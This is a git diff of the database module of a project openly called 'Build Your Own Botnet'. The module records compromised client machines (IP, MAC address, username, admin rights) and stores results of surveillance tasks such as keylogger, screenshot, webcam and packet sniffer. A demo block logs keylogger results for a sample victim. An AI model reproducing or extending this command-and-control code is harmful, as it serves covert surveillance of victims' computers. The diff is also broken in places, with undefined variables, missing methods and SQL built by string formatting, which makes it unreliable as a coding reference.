@@ -5,14 +5,23 @@ github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
 """
 from __future__ import print_function
+
+# standard library
 import os
 import json
 import time
 import Queue
+import random
+import hashlib
+import logging
 import colorama
 import datetime
 import threading
+import collections
 import mysql.connector
+
+# byob
+import util
 
 
 class DatabaseError(mysql.connector.ProgrammingError):
@@ -23,207 +32,174 @@ class Database(mysql.connector.MySQLConnection):
     """
     Database (Build Your Own Botnet)
     """
-    def __init__(self, setup='setup.sql', tasks=('persistence','screenshot','webcam','email','scan','packetsniffer'), **kwargs):
+    def __init__(self, **kwargs):
+
         """
-        create a new Database handler instance
-             setup      path to setup.sql batch file to create the database
-             tasks      types of task results for the database to store during the session
-             kwargs     MysQL database credentials: host, user, password [,database]
+        connect to MySQL and setup the BYOB database
+
+            kwargs:
+
+                host        hostname/IP address of MySQL host machine
+                            
+                user        authorized account username
+                    
+                password    authorized account password
+
         """
         super(Database, self).__init__(**kwargs)
         self.config(**kwargs)
-        self.tasks = tasks
-        self.queue = Queue.Queue()
-        self.setup = self._setup(setup)
-        self.query = self.cursor(named_tuple=True)
+        self.logger = util.logger()
+        self.tasks  = {}
+        self._debug = debug
+        self._query = self.cursor(dictionary=True)
+        self._queue = Queue.Queue()
+        self._color = util.color()
+        self._setup(setup)
 
-    def _debug(self, output):
-        if self._debug:
-            print(str(output))
 
-    def _setup(self, setup):
-        if isinstance(setup, str):
-            if os.path.isfile(setup):
-                try:
-                    self.execute_file(setup)
-                    return True
-                except Exception as e:
-                    self._debug("{} error: {}".format(self._setup.func_name, str(e)))
-        raise DatabaseError("{} error: database setup file is broken")
-            
-    def _print(self, info):
-        if isinstance(info, dict):
-            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
-            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
-            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
-            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
-            for key in keys.values():
-                if info.get(key) and info.get(key) != 'None':
-                    if len(str(info.get(key))) > 80:
-                        info[key] = str(info.get(key))[:77] + '...'
-                    info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(info.get(key)).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(info.get(key), datetime.datetime) else str(int(time.mktime(info.get(key).timetuple())))
-                    print('\x20' * 4 + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
-        elif isinstance(info, str):
-            try:
-                info = json.loads(info)
-                self._print(info)
-            except:
-                print(info)
+    def _setup(self):
+        try:
+            with open('resources/setup.sql', 'r') as fd:
+                sql = fd.read().replace('{user}', self.user).replace('{host}', self.server_host)
+                self.execute_file(sql)
+        except Exception as e:
+            raise DatabaseError(str(e))
+
+    def _display(self, data, indent=2):
+        if isinstance(data, dict):
+            for k,v in data.items():
+                if isinstance(v, datetime.datetime):
+                    data[k] = v.ctime()
+            i = data.pop('id',None)
+            print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-3)) if i else None
+            for k,v in data.items():
+                if isinstance(v, unicode):
+                    try:
+                        j = json.loads(v.encode())
+                        self._display(j, indent+2)
+                    except:
+                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                elif isinstance(v, list):
+                    for i in v:
+                        if isinstance(v, dict):
+                            print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
+                            self._display(v, indent+2)
+                        else:
+                            print(colorama.Style.BRIGHT + self._color + str(i).ljust(4  * indent).center(5 * indent))
+                elif isinstance(v, dict):
+                    print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
+                    self._display(v, indent+1)
+                elif isinstance(v, int):
+                    if v in (0,1):
+                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(bool(v)).encode())
+                    else:
+                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                else:
+                    print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+        elif isinstance(data, list):
+            for row in data:
+                if isinstance(row, dict):
+                    self._display(row, indent+2)
+                else:
+                    print(colorama.Style.BRIGHT + self._color + str(row).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                    
         else:
-            print("Server method {} received invalid input ({}): '{}'".format(self._print.func_name, type(info), repr(info)))
+            if hasattr(data, '_asdict'):
+                data = data._asdict()
+            if isinstance(data, collections.OrderedDict):
+                data = dict(data)
+            if isinstance(data, dict):
+                i = data.pop('id',None)
+                print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-1)) if i else None
+                self._display(data, indent+2)
 
+            else:
+                print(colorama.Style.BRIGHT + self._color + str(data.encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + v.encode()))
 
+            
     def _reconnect(self):
         try:
             self.reconnect()
-            self.query = self.cursor(named_tuple=True)
+            self._query = self.cursor(named_tuple=True)
             return "{}@{} reconnected".format(self.database.user, self.database.server_host)
         except Exception as e:
-            self._debug("{} error: {}".format(self._reconnect.func_name, str(e)))
-
-    def _display(self, info):
-        print('\n')
-        if isinstance(info, dict):
-            if len(info):
-                self._print(json.dumps(info))
-        elif isinstance(info, list):
-            if len(info):
-                for data in info:
-                    print('  %d\n' % int(info.index(data) + 1), end="")
-                    self._print(data)
-        elif isinstance(info, str):
-            try:
-                self._print(json.loads(info))
-            except:
-                self._print(str(info))
-        else:
-            self._debug("{} error: invalid data type '{}'".format(self._display.func_name, type(info)))
+            util.debug("{} error: {}".format(self._reconnect.func_name, str(e)))
 
 
-    def get_client(self, client_id=None):
+    def get_clients(self, verbose=False, display=False):
         """
-        Get client from database
+        Return json list of clients
         """
-        try:
+        clients = self.execute_query("SELECT * FROM tbl_clients ORDER BY online" if verbose else "SELECT id, public_ip, uid, last_online FROM tbl_clients ORDER BY online desc")   
+        if display:
+            self._display(clients)
+        return clients
 
-        except Exception as e:
-            
-        
 
-
-    def handle_client(self, **kwargs):
+    def update_client(self, client_id, online):
         """
-        Handle a new/current client by adding/updating database
-        """
-        try:
-            if kwargs.get('id') and isinstance(kwargs['id'], str) and len(kwargs['id']) == 32:
-                client_id = kwargs.get('id')
-                if self.execute_query("SELECT * FROM tbl_clients WHERE id='{}'".format(client_id)):
-                    self.execute_query("UPDATE tbl_clients SET last_online='{}' WHERE id='{}'".format(datetime.datetime.now(), client_id))
-                    print("\n\n" + colorama.Fore.GREEN  + colorama.Style.DIM + " [+] " + colorama.Fore.RESET + "Client {} has reconnected\n".format(self._name))
-                else:
-                    print("\n\n" + colorama.Fore.GREEN  + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "New connection - Client {}: \n".format(self._name))
-                    self._display(data)
-                    values = map(data.get, ['id', 'public_ip', 'local_ip', 'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture'])
-                    try:
-                        self.execute_procedure('sp_addClient', values)
-                    except mysql.connector.InterfaceError:
-                        pass
-
-
-    def offline_client(self, client_id=None):
-        """
-        Update client status to offline
+        Update client status to online/offline
         """
         try:
             if isinstance(client_id, str):
-                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE uid='%s'" % client_id)
+                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE uid='%s'" % (int(online), str(client_id)))
             elif isinstance(client_id, int):
-                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE id='%d'" % client_id)
+                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE id=%d" % (int(online), int(client_id)))
             else:
-                raise DatabaseError("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
+                util.debug("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
         except Exception as e:
-            self._debug("{} error: {}".format(self.offline_client.func_name, str(e)))
-         
-                    
+            util.debug("{} error: {}".format(self.offline_client.func_name, str(e)))
+            
 
-    def remove_client(self, client_id=None):
+    def remove_client(self, client_id):
         """
         Remove client from database
         """
         try:
             if isinstance(client_id, str):
-                self.execute_query("DELETE FROM tbl_clients WHERE uid='{}'".format(task_id))
+                self.execute_query("DELETE FROM tbl_clients WHERE id='%s'" % task_id)
             elif isinstance(client_id, int):
                 self.execute_query("DELETE FROM tbl_clients WHERE id=%d" % client_id)
             else:
-                raise DatabaseError("{} error: invalid input type (expected {}, received {})".format(self.remove_client.func_name, list, type(client_id)))
+                util.debug("{} error: invalid input type (expected {}, received {})".format(self.remove_client.func_name, list, type(client_id)))
         except Exception as e:
-            self._debug("{} error: {}".format(self.remove_client.func_name, str(e)))
+            util.debug("{} error: {}".format(self.remove_client.func_name, str(e)))
 
 
     def set_tasks(self, tasks):
         """
-        Configure types of task results for database to automatically store
+        Set types of task results for database to store
         """
         if isinstance(tasks, list) or isinstance(tasks, set):
             self._store_tasks = tasks
         elif isinstance(tasks, dict):
             self._store_tasks = [task for task,value in tasks.items() if value]
         else:
-            raise DatabaseError("{} error: argument 'tasks' must be type {}".format(self.set_tasks.func_name, list))
+            util.debug("{} error: argument 'tasks' must be type {}".format(self.set_tasks.func_name, list))
 
 
-    def get_tasks(self, session_id=None):
+    def get_tasks(self, client_id=None, display=True):
         """
-        Get session task results
+        Get any/all clients task results
         """
         try:
-            if session_id and isinstance(session_id, str) and len(session_id) == 32:
+            tasks = None
+            if client_id:
                 try:
-                    return self.execute_query("SELECT * FROM tbl_tasks WHERE session='{}'".format(session_id), display=True)
+                    tasks = self.execute_query("SELECT * FROM tbl_tasks WHERE client='{}'".format(client_id), display=False)
                 except Exception as e:
-                    self._debug("{} error: {}".format(self.show_results.func_name, str(e)))
+                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
             else:
-                return "Error: invalid session id - '%s'" % str(session_id)
+                try:
+                    tasks = self.execute_query("SELECT * FROM tbl_tasks", display=False)
+                except Exception as e:
+                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
+            if tasks:
+                if display:
+                    self._display(tasks)
+                return tasks
         except Exception as e:
-            self._debug("{} error: {}".format(self.get_tasks.func_name, str(e)))
-
-
-    def handle_task(self, task):
-        """
-        Handle an issued/received task by adding/updating database 
-        """
-        try:
-            if isinstance(task, dict):
-                if task.get('client') and task.get('session') and task.get('task']):
-                    cmd, _, __  = task['task'].partition(' ')
-                    if cmd in self._store_tasks:
-                        if task.get('result') and task.get('id'):
-                            self.execute_query("UPDATE tbl_tasks SET result='{}' WHERE id='{}'".format(task['result'], task['id']), display=False)
-                        else:
-                            values = [task['client'], task['session'], task['task'], '@task']
-                            self.execute_stored_procedure('sp_addTask', args=values, display=False)
-                            task = self.execute_query('SELECT @task', display=False)
-                            return task
-                else:
-                    self._debug("{} error: missing one or more arguments ('client','session','task')".format(self.handle_task.func_name))
-            else:
-                self._debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
-        except Exception as e:
-            self._debug("{} error: {}".format(self.handle_task.func_name, str(e)))
-
-
-    def remove_task(self, task_id):
-        """
-        Remove a task from the database
-        """
-        try:
-            if isinstance(task_id, str):
-                self.execute_query("DELETE FROM tbl_tasks WHERE id='{}'".format(task_id))
-            else:
-                raise DatabaseError("{} error: invalid input type (expected {}, received {})".format(self.remove_task.func_name, str, type(task_id)))
-            
+            util.debug("{} error: {}".format(self.get_tasks.func_name, str(e)))
 
     def execute_query(self, query, display=False):
         """
@@ -234,27 +210,26 @@ class Database(mysql.connector.MySQLConnection):
             if not self.is_connected():
                 self._reconnect()
             result = []
-            self.query.execute(query)
-            output = self.query.fetchall()
-            if output and isinstance(output, list):
+            self._query.execute(query)
+            output = self._query.fetchall()
+            if output:
                 for row in output:
-                    row = row._asdict()
-                    for key,value in [(key,value) for key,value in row.items() if key in ('last_update','issued','completed','timestamp')]:
-                        if isinstance(value, datetime.datetime):
-                            row[key] = value.ctime()
+                    if hasattr(row, '_asdict'):
+                        row = row._asdict()
+                    for key,value in [(key,value) for key,value in row.items() if isinstance(value, datetime.datetime)]:
+                        row[key] = value.ctime()
+                    if display:
+                        self._display(row)
                     result.append(row)
-            if display:
-                for row in result:
-                    self._display(json.dumps(row))
-        except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError):
-            pass
+        except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError) as e:
+            util.debug(e)
         except Exception as e:
-            self._debug("{} error: {}".format(self.execute_query.func_name, str(e)))
+            util.debug("{} error: {}".format(self.execute_query.func_name, str(e)))
         finally:
             return result
 
 
-    def execute_stored_procedure(self, procedure, args=[], display=False):
+    def execute_procedure(self, procedure, args=[], display=False):
         """
         Execute a stored procedure and return result, optionally printing output to stdout
         """
@@ -264,38 +239,83 @@ class Database(mysql.connector.MySQLConnection):
                 self._reconnect()
             cursor = self.cursor(dictionary=True)
             cursor.callproc(procedure, args)
-            result = [row for result in cursor.stored_results() for row in result.fetchall()]
-            return result
+            result = [row for row in cursor.stored_results() for row in result.fetchall()]
         except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
             pass
         finally:
             return result
 
 
-    def execute_file(self, sql, display=False):
+    def execute_file(self, filename=None, sql=None, display=False):
         """
-        Execute SQL commands sequentially from a file
+        Execute SQL commands sequentially from a string or file
         """
         try:
             result = []
-            if isinstance(sql, str):
-                if os.path.isfile(sql):
-                    with open(sql) as stmts:
-                        for line in self.query.execute(stmts.read(), multi=True):
-                            result.append(line)
-                            if display:
-                                print(line)
-                else:
-                    self.query.execute(sql, multi=True)
-            elif isinstance(sql, file):
-                with sql as stmts:
-                    for line in self.query.execute(stmts.read(), multi=True):
+            if os.path.isfile(filename):
+                with open(filename) as stmts:
+                    for line in self._query.execute(stmts.read(), multi=True):
                         result.append(line)
                         if display:
                             print(line)
-            else:
-                return False
+            elif isinstance(sql, str):
+                for line in self._query.execute(sql, multi=True):
+                    result.append(line)
+                    if display:
+                        print(line)
+            elif isinstance(sql, list) or isinstance(sql, tuple):
+                sql = '\n'.join(sql)
+                for line in self._query.execute_query(sql, multi=True):
+                     result.append(line)
+                     if display:
+                         print(line)
             return result
         except Exception as e:
-            raise DatabaseError("{} error: {}".format(self.execute_file.func_name, str(e)))
+            util.debug("{} error: {}".format(self.execute_file.func_name, str(e)))
 
+
+    def handle_client(self, client):
+        """
+        Handle a new/current client by adding/updating database
+        """
+        args = (json.dumps(client._info), '@client')
+        _ = self.execute_procedure('sp_handle_client', args=args, display=False)
+        info = self.execute_query('SELECT @client', display=False)
+        client._info = info
+        if client._info['uid'] not in self.tasks:
+            self.tasks[client._info['uid']] = []
+        return info
+    
+
+    def handle_task(self, task):
+        """
+        Adds results to database for configured task type
+        """
+        try:
+            if not isinstance(task, dict):
+                try:
+                    task = json.loads(str(task))
+                except:
+                    pass
+            if isinstance(task, dict):
+                args = (json.dumps(task), '@taskid')
+                _ = self.execute_procedure("sp_handle_task", args=args)
+                task_id = self.execute_query("SELECT @taskid")
+                self.tasks[task['client']].append(task_id)
+                return task_id
+            else:
+                util.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
+        except Exception as e:
+            util.debug("{} error: {}".format(self.handle_task.func_name, str(e)))
+
+
+if __name__ == '__main__':
+    colorama.init()
+    d = Database()
+    client = {"public_ip": "132.99.245.10", "local_ip": "192.168.1.2", "mac_address": "4D:10:CC:22:09:8D", "platform": "win32", "device": "toms laptop", "username": "tom", "administrator": False, "architecture": 64}
+    info,item = d.handle_client(client)
+    d.handle_task({"client": hashlib.md5(client['public_ip'] + client['mac_address']).hexdigest(), "task": "keylogger", "result": "https://pastebin.com/4RcdSls"})
+    d.handle_task({"client": hashlib.md5(client['public_ip'] + client['mac_address']).hexdigest(), "task": "screenshot", "result": "https://i.imgur.com/09FcsdTn"})
+    d.get_clients(verbose=True, display=True)
+    d.update_client_status(4, 0)
+                
